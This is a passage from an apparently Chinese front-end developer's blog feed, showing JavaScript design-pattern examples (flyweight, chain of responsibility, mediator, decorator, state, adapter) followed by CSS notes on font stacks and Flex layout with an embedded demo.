    <span>maxHeight</span><span>:</span> <span>'400px'</span><span>,</span>
    <span>border</span><span>:</span> <span>'1px solid red'</span><span>,</span>
    <span>overflow</span><span>:</span> <span>'auto'</span><span>,</span>
  <span>}</span>
  innerStyle <span>=</span> <span>{</span>
    <span>position</span><span>:</span> <span>'relative'</span><span>,</span>
    <span>height</span><span>:</span> <span><span>`</span><span><span>${</span><span>DIVHEIGHT</span> <span>*</span> films<span>.</span>length<span>}</span></span><span>px</span><span>`</span></span><span>,</span>
  <span>}</span>
  Object<span>.</span><span>entries</span><span>(</span>outerStyle<span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span><span>[</span>key<span>,</span> value<span>]</span></span><span>)</span> <span>=></span> outerContainer<span>.</span>style<span>[</span>key<span>]</span> <span>=</span> value<span>)</span>
  Object<span>.</span><span>entries</span><span>(</span>innerStyle<span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span><span>[</span>key<span>,</span> value<span>]</span></span><span>)</span> <span>=></span> innerContainer<span>.</span>style<span>[</span>key<span>]</span> <span>=</span> value<span>)</span>

  outerContainer<span>.</span><span>appendChild</span><span>(</span>innerContainer<span>)</span>
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>outerContainer<span>)</span>
  <span>return</span> <span>{</span> outerContainer<span>,</span> innerContainer <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

<span>// 加载节点</span>
<span>function</span> <span>loadNode</span><span>(</span><span>start<span>,</span> end</span><span>)</span> <span>{</span>
  films<span>.</span><span>slice</span><span>(</span>start<span>,</span> end<span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>filmData<span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> filmFlyweight <span>=</span> <span>createFilmFlyweight</span><span>(</span>filmData<span>.</span>category<span>)</span>
    <span>const</span> div <span>=</span> <span>createDiv</span><span>(</span>innerContainer<span>)</span>
    div<span>.</span><span>setExternalState</span><span>(</span>
      <span>{</span> <span>text</span><span>:</span> filmData<span>.</span>name<span>,</span> <span>serialNumber</span><span>:</span> start <span>+</span> index <span>}</span><span>,</span>
      <span>(</span><span>)</span> <span>=></span> <span>{</span>
        filmFlyweight<span>.</span><span>setExternalState</span><span>(</span><span>{</span> <span>name</span><span>:</span> filmData<span>.</span>name <span>}</span><span>)</span>
        console<span>.</span><span>log</span><span>(</span>filmFlyweight<span>.</span><span>getState</span><span>(</span><span>)</span><span>)</span>
      <span>}</span>
    <span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>loadNode</span><span>(</span><span>0</span><span>,</span> <span>POOLQUANTITY</span><span>)</span>
<span>let</span> current <span>=</span> <span>0</span>
outerContainer<span>.</span><span>addEventListener</span><span>(</span><span>'scroll'</span><span>,</span> <span>e</span> <span>=></span> <span>{</span>
  <span>const</span> start <span>=</span> <span>(</span>outerContainer<span>.</span>scrollTop <span>/</span> <span>DIVHEIGHT</span><span>)</span> <span>|</span> <span>0</span>
  <span>if</span> <span>(</span>start <span>!==</span> current<span>)</span> <span>{</span>
    <span>loadNode</span><span>(</span>start<span>,</span> start <span>+</span> <span>POOLQUANTITY</span><span>)</span>
    current <span>=</span> start
  <span>}</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br></div></div><h2 id="_19-职责链模式"> 19. 职责链模式</h2>
<ul>
<li>
<p>使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。</p>
<blockquote>
<p>应用：拦截器等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>order500</span> <span>=</span> <span>(</span><span>type<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>type <span>===</span> <span>1</span> <span>&amp;&amp;</span> pay<span>)</span> <span>return</span> <span>'500 元定金预购，得到 100 优惠券'</span>
  <span>return</span> <span>'nextSuccessor'</span>
<span>}</span>
<span>const</span> <span>order200</span> <span>=</span> <span>(</span><span>type<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>type <span>===</span> <span>2</span> <span>&amp;&amp;</span> pay<span>)</span> <span>return</span> <span>'200 元定金预购，得到 50 优惠券'</span>
  <span>return</span> <span>'nextSuccessor'</span>
<span>}</span>
<span>const</span> <span>orderNormal</span> <span>=</span> <span>(</span><span>type<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>stock <span>></span> <span>0</span><span>)</span> <span>return</span> <span>'普通购买，无优惠券'</span>
  <span>return</span> <span>'手机库存不足'</span>
<span>}</span>

<span>Function</span><span>.</span>prototype<span>.</span><span>after</span> <span>=</span> <span>function</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> callback <span>!==</span> <span>'function'</span><span>)</span>
    <span>throw</span> <span>new</span> <span>TypeError</span><span>(</span><span>'callback is not a function'</span><span>)</span>
  <span>const</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>const</span> result <span>=</span> <span>self</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
    <span>if</span> <span>(</span>result <span>===</span> <span>'nextSuccessor'</span><span>)</span> <span>return</span> <span>callback</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
    <span>return</span> result
  <span>}</span>
<span>}</span>

<span>const</span> order <span>=</span> order500<span>.</span><span>after</span><span>(</span>order200<span>)</span><span>.</span><span>after</span><span>(</span>orderNormal<span>)</span>

<span>order</span><span>(</span><span>1</span><span>,</span> <span>true</span><span>,</span> <span>500</span><span>)</span> <span>// => '500 元定金预购，得到 100 优惠券'</span>
<span>order</span><span>(</span><span>2</span><span>,</span> <span>true</span><span>,</span> <span>500</span><span>)</span> <span>// => '200 元定金预购，得到 50 优惠券'</span>
<span>order</span><span>(</span><span>1</span><span>,</span> <span>false</span><span>,</span> <span>500</span><span>)</span> <span>// => '普通购买，无优惠券'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><h2 id="_20-中介者模式"> 20. 中介者模式</h2>
<ul>
<li>
<p>中介者模式的作用就是解除对象与对象之间的紧耦合关系，使网状的多对多关系变成了相对简单的一对多关系。</p>
</li>
<li>
<p>中介者模式和发布订阅模式非常相似，区别在于通信方式和结构上的差异。</p>
<blockquote>
<ul>
<li>中介者模式中每个模块都可以发布消息（中介者本身也可以发布消息），而发布订阅模式中观察者只能被动的等待消息。</li>
<li>中介者模式是星状结构，中介者是一个 ”控制点“，而发布订阅机制本身是一个 ”控制层”，意味着高层可以通过控制层操作下层模块（当然也可以通过代码实现下层控制高层）。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>class</span> <span>Player</span> <span>{</span>
  partners <span>=</span> <span>[</span><span>]</span> <span>// 队友列表</span>
  enemies <span>=</span> <span>[</span><span>]</span> <span>// 敌人列表</span>
  state <span>=</span> <span>'live'</span> <span>// 玩家状态</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> teamColor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name <span>// 角色名字</span>
    <span>this</span><span>.</span>teamColor <span>=</span> teamColor <span>// 队伍颜色</span>
  <span>}</span>
  <span>// 胜利</span>
  <span>win</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'winner: '</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span>
  <span>}</span>
  <span>// 失败</span>
  <span>lose</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'loser: '</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span>
  <span>}</span>
  <span>// 死亡</span>
  <span>die</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> partners<span>,</span> enemies <span>}</span> <span>=</span> <span>this</span>
    <span>this</span><span>.</span>state <span>=</span> <span>'dead'</span>
    <span>const</span> allDead <span>=</span> partners<span>.</span><span>every</span><span>(</span><span>i</span> <span>=></span> i<span>.</span>state <span>===</span> <span>'dead'</span><span>)</span>

    <span>if</span> <span>(</span>allDead <span>===</span> <span>true</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>lose</span><span>(</span><span>)</span>
      partners<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> i<span>.</span><span>lose</span><span>(</span><span>)</span><span>)</span>
      enemies<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> i<span>.</span><span>win</span><span>(</span><span>)</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>// 玩家列表</span>
<span>const</span> players <span>=</span> <span>[</span><span>]</span>

<span>// 创建玩家</span>
<span>const</span> <span>createPlayer</span> <span>=</span> <span>(</span><span>name<span>,</span> teamColor</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> newPlayer <span>=</span> <span>new</span> <span>Player</span><span>(</span>name<span>,</span> teamColor<span>)</span>
  players<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>i<span>.</span>teamColor <span>===</span> newPlayer<span>.</span>teamColor<span>)</span> <span>{</span>
      <span>// 同队</span>
      i<span>.</span>partners<span>.</span><span>push</span><span>(</span>newPlayer<span>)</span>
      newPlayer<span>.</span>partners<span>.</span><span>push</span><span>(</span>i<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>// 敌队</span>
      i<span>.</span>enemies<span>.</span><span>push</span><span>(</span>newPlayer<span>)</span>
      newPlayer<span>.</span>enemies<span>.</span><span>push</span><span>(</span>i<span>)</span>
    <span>}</span>
  <span>}</span><span>)</span>

  players<span>.</span><span>push</span><span>(</span>newPlayer<span>)</span>
  <span>return</span> newPlayer
<span>}</span>

<span>// 红队</span>
<span>const</span> player1 <span>=</span> <span>createPlayer</span><span>(</span><span>'Neo'</span><span>,</span> <span>'red'</span><span>)</span><span>,</span>
  player2 <span>=</span> <span>createPlayer</span><span>(</span><span>'Trinity'</span><span>,</span> <span>'red'</span><span>)</span><span>,</span>
  player3 <span>=</span> <span>createPlayer</span><span>(</span><span>'Morpheus'</span><span>,</span> <span>'red'</span><span>)</span><span>,</span>
  player4 <span>=</span> <span>createPlayer</span><span>(</span><span>'Tank'</span><span>,</span> <span>'red'</span><span>)</span>

<span>// 蓝队</span>
<span>const</span> player5 <span>=</span> <span>createPlayer</span><span>(</span><span>'Smith'</span><span>,</span> <span>'blue'</span><span>)</span><span>,</span>
  player6 <span>=</span> <span>createPlayer</span><span>(</span><span>'Oracle'</span><span>,</span> <span>'blue'</span><span>)</span><span>,</span>
  player7 <span>=</span> <span>createPlayer</span><span>(</span><span>'Architect'</span><span>,</span> <span>'blue'</span><span>)</span><span>,</span>
  player8 <span>=</span> <span>createPlayer</span><span>(</span><span>'Merovingian'</span><span>,</span> <span>'blue'</span><span>)</span>

player5<span>.</span><span>die</span><span>(</span><span>)</span>
player6<span>.</span><span>die</span><span>(</span><span>)</span>
player7<span>.</span><span>die</span><span>(</span><span>)</span>
player8<span>.</span><span>die</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br></div></div><h2 id="_21-装饰者模式"> 21. 装饰者模式</h2>
<ul>
<li>
<p>装饰者模式能够在不改变对象自身的基础上，在程序运行期间给对象动态地添加职责。跟继承相比，装饰者是一种更轻便灵活的做法，这是一种 “即用即付” 的方式。</p>
<div><pre><code><span>const</span> hero <span>=</span> <span>{</span>
  <span>buff</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'蓝BUFF'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>const</span> <span>redDecorator</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'红BUFF'</span><span>)</span>
<span>}</span>
<span>const</span> <span>dragonDecorator</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'大龙BUFF'</span><span>)</span>
<span>}</span>
<span>const</span> buff1 <span>=</span> hero<span>.</span>buff
hero<span>.</span><span>buff</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>buff1</span><span>(</span><span>)</span>
  <span>redDecorator</span><span>(</span><span>)</span>
<span>}</span>
<span>const</span> buff2 <span>=</span> hero<span>.</span>buff
hero<span>.</span><span>buff</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>buff2</span><span>(</span><span>)</span>
  <span>dragonDecorator</span><span>(</span><span>)</span>
<span>}</span>
hero<span>.</span><span>buff</span><span>(</span><span>)</span> <span>// => 依次打印：蓝BUFF -> 红BUFF -> 大龙BUFF</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div></li>
<li>
<p>ES 提案中的装饰器（<a href="https://es6.ruanyifeng.com/#docs/decorator" target="_blank" rel="noopener noreferrer">ECMAScript 6 入门 - 阮一峰</a>）。</p>
<div><pre><code><span>const</span> <span>blueDecorator</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'蓝BUFF'</span><span>)</span>
<span>}</span>
<span>const</span> <span>redDecorator</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'红BUFF'</span><span>)</span>
<span>}</span>
<span>const</span> <span>dragonDecorator</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'大龙BUFF'</span><span>)</span>
<span>}</span>

<span>class</span> <span>Hero</span> <span>{</span>
  @blueDecorator
  @redDecorator
  @dragonDecorator
  <span>buff</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
</ul>
<h2 id="_22-状态模式"> 22. 状态模式</h2>
<ul>
<li>
<p>允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。</p>
<blockquote>
<p>应用：React、Vue 等框架中的组件。</p>
</blockquote>
</li>
<li>
<p>与策略模式之间的区别：策略模式中的各个策略类之间是平等又平行的，它们之间没有任何联系，所以客户必须熟知这些策略类的作用，以便客户可以随时主动切换算法。而在状态模式中，状态和状态对应的行为是早已被封装好的，状态之间的切换也早被规定完成，“改变行为” 这件事情发生在状态模式内部。对客户来说，并不需要了解这些细节，这正是状态模式的作用所在。</p>
</li>
</ul>
<div><pre><code><span>const</span> <span>delegate</span> <span>=</span> <span>(</span><span>client<span>,</span> delegation</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>buttonWasPressed</span><span>(</span><span>)</span> <span>{</span>
      <span>// 将客户的操作委托给 delegation 对象</span>
      <span>return</span> delegation<span>.</span><span>buttonWasPressed</span><span>.</span><span>apply</span><span>(</span>client<span>,</span> arguments<span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>
<span>const</span> <span>FSM</span> <span>=</span> <span>{</span>
  <span>off</span><span>:</span> <span>{</span>
    <span>buttonWasPressed</span><span>(</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'关灯'</span><span>)</span>
      <span>this</span><span>.</span>button<span>.</span>innerHTML <span>=</span> <span>'下一次按我是开灯'</span>
      <span>this</span><span>.</span>currentState <span>=</span> <span>this</span><span>.</span>onState
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>on</span><span>:</span> <span>{</span>
    <span>buttonWasPressed</span><span>(</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'开灯'</span><span>)</span>
      <span>this</span><span>.</span>button<span>.</span>innerHTML <span>=</span> <span>'下一次按我是关灯'</span>
      <span>this</span><span>.</span>currentState <span>=</span> <span>this</span><span>.</span>offState
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>class</span> <span>Light</span> <span>{</span>
  button
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>offState <span>=</span> <span>delegate</span><span>(</span><span>this</span><span>,</span> <span>FSM</span><span>.</span>off<span>)</span>
    <span>this</span><span>.</span>onState <span>=</span> <span>delegate</span><span>(</span><span>this</span><span>,</span> <span>FSM</span><span>.</span>on<span>)</span>
    <span>this</span><span>.</span>currentState <span>=</span> <span>this</span><span>.</span>offState <span>// 设置初始状态为关闭状态</span>
  <span>}</span>
  <span>init</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> button <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'button'</span><span>)</span>
    button<span>.</span>innerHTML <span>=</span> <span>'已关灯'</span>
    <span>this</span><span>.</span>button <span>=</span> document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>button<span>)</span>
    <span>this</span><span>.</span>button<span>.</span><span>onclick</span> <span>=</span> <span>_</span> <span>=></span> <span>this</span><span>.</span>currentState<span>.</span><span>buttonWasPressed</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> light <span>=</span> <span>new</span> <span>Light</span><span>(</span><span>)</span>
light<span>.</span><span>init</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br></div></div><h2 id="_23-适配器模式"> 23. 适配器模式</h2>
<ul>
<li>
<p>适配器模式是一对相对简单的模式。作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。</p>
<blockquote>
<p>应用：Vue 中的 computed 等。</p>
</blockquote>
</li>
<li>
<p>如果现有的接口已经能够正常工作，那我们就永远不会用上适配器模式。适配器模式是一种 “亡羊补牢” 的模式，没有人会在程序的设计之初就使用它。</p>
</li>
</ul>
<div><pre><code><span>const</span> googleMap <span>=</span> <span>{</span>
  <span>show</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'开始渲染谷歌地图'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>const</span> baiduMap <span>=</span> <span>{</span>
  <span>display</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'开始渲染百度地图'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>// 适配 renderMap</span>
<span>const</span> baiduMapAdapter <span>=</span> <span>{</span>
  <span>show</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> baiduMap<span>.</span><span>display</span><span>(</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>const</span> <span>renderMap</span> <span>=</span> <span>map</span> <span>=></span> map<span>?.</span>show<span>?.</span><span>(</span><span>)</span>

<span>renderMap</span><span>(</span>googleMap<span>)</span>
<span>renderMap</span><span>(</span>baiduMapAdapter<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>CSS</title>
      <link>https://www.matrixtheone.ga/web/note/CSS/</link>
      <guid>https://www.matrixtheone.ga/web/note/CSS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-网页字体设计"> 1. <a href="https://www.bilibili.com/video/BV1b54y1Z7pu" target="_blank" rel="noopener noreferrer">网页字体设计</a></h2>
<div><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> Emoji<span>;</span>
  <span>src</span><span>:</span> <span>local</span><span>(</span><span>'Apple Color Emojiji'</span><span>)</span><span>,</span> <span>local</span><span>(</span><span>'Segoe UI Emoji'</span><span>)</span><span>,</span> <span>local</span><span>(</span>
      <span>'Segoe UI Symbol'</span>
    <span>)</span><span>,</span> <span>local</span><span>(</span><span>'Noto Color Emoji'</span><span>)</span><span>;</span>
  <span>unicode-range</span><span>:</span> U+1F000-1F644<span>,</span> U+203C-3299<span>;</span>
<span>}</span>

<span>body</span> <span>{</span>
  <span>font-family</span><span>:</span> system-ui<span>,</span> —apple-system<span>,</span> Segoe UI<span>,</span> Rototo<span>,</span> Emoji<span>,</span> Helvetica<span>,</span> Arial<span>,</span>
    sans-serif<span>;</span>
<span>}</span>

<span>/* 衬线字体 */</span>
<span>.font-serif</span> <span>{</span>
  <span>font-family</span><span>:</span> Georgia<span>,</span> Cambria<span>,</span> <span>'Times New Roman'</span><span>,</span> Times<span>,</span> serif<span>;</span>
<span>}</span>

<span>/* 等宽字体 */</span>
<span>.font-mono</span> <span>{</span>
  <span>font-family</span><span>:</span> Menlo<span>,</span> Monaco<span>,</span> Consolas<span>,</span> <span>'Liberation Mono'</span><span>,</span> <span>'Courier New'</span><span>,</span>
    monospace<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_2-flex"> 2. Flex</h2>
<ul>
<li>
<p>可用于 Flex 项目的属性有 align-self 和 margin: auto。</p>
</li>
<li>
<p>align-content 属性必须要在 flex-wrap 属性值为 wrap 或 wrap-reverse 条件下才能正常工作；但 align-items 属性则不需要。</p>
</li>
<li>
<p>默认情况之下，Flex 项目（即设置了 flex:1 ）在收缩的时候，其宽度也不会小于其最小内容尺寸（min-content）或固定尺寸元素。如果要改变这一点，需要在 Flex 项目上显示设置最小宽度 min-width (或 min-inline-size)，或最小高度 min-height（或 min-block-size）的值，一般将其设置为 0。需要在使用 overflow-wrap 为 break-word 的地方重置 min-width 值，并且强制它变成 0。</p>
</li>
</ul>

          <div
            id="code-demo-23f98faa"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%20class%3D%5C%22ma%5C%22%3E%5Cn%20%20%20%20%3Cdiv%3Emargin-left%3A%20auto%3C%2Fdiv%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%20%20%3Csection%20class%3D%5C%22fw%5C%22%3E%5Cn%20%20%20%20%3Cdiv%3Ealign-content%3A%20center%3C%2Fdiv%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%20%20%3Csection%20class%3D%5C%22mw%5C%22%3E%5Cn%20%20%20%20%3Cdiv%3Eminwidthminwidth%3C%2Fdiv%3E%5Cn%20%20%20%20%3Cdiv%3Eminwidthminwidthminwidthminwidth%3C%2Fdiv%3E%5Cn%20%20%20%20%3Cdiv%3Eminwidthminwidthminwidthminwidthminwidthminwidth%3C%2Fdiv%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20grid-template-columns%3A%20repeat(2%2C%201fr)%3B%5Cn%20%20grid-template-rows%3A%20repeat(2%2C%201fr)%3B%5Cn%20%20grid-template-areas%3A%5Cn%20%20%20%20'ma%20fw'%5Cn%20%20%20%20'mw%20mw'%3B%5Cn%20%20gap%3A%201rem%3B%5Cn%7D%5Cn%5Cn.ma%20%7B%5Cn%20%20grid-area%3A%20ma%3B%5Cn%20%20display%3A%20flex%3B%5Cn%20%20flex-wrap%3A%20wrap%3B%5Cn%20%20align-content%3A%20center%3B%5Cn%20%20background%3A%20skyblue%3B%5Cn%20%20padding%3A%201rem%3B%5Cn%7D%5Cn%5Cn.ma%20div%20%7B%5Cn%20%20margin-left%3A%20auto%3B%5Cn%7D%5Cn%5Cn.fw%20%7B%5Cn%20%20grid-area%3A%20fw%3B%5Cn%20%20display%3A%20flex%3B%5Cn%20%20flex-wrap%3A%20wrap%3B%5Cn%20%20%2F*%20justify-content%3A%20center%3B%5Cn%20%20align-content%3A%20center%3B%20*%2F%5Cn%20%20place-content%3A%20center%3B%5Cn%20%20background%3A%20pink%3B%5Cn%7D%5Cn%5Cn.mw%20%7B%5Cn%20%20grid-area%3A%20mw%3B%5Cn%20%20display%3A%20flex%3B%5Cn%7D%5Cn%5Cn.mw%20div%20%7B%5Cn%20%20flex%3A%201%3B%5Cn%20%20min-width%3A%200%3B%5Cn%20%20padding%3A%201rem%3B%5Cn%20%20overflow-wrap%3A%20break-word%3B%5Cn%7D%5Cn%5Cn.mw%20div%3Anth-child(1)%20%7B%5Cn%20%20background%3A%20bisque%3B%5Cn%7D%5Cn%5Cn.mw%20div%3Anth-child(2)%20%7B%5Cn%20%20background%3A%20aqua%3B%5Cn%7D%5Cn%5Cn.mw%2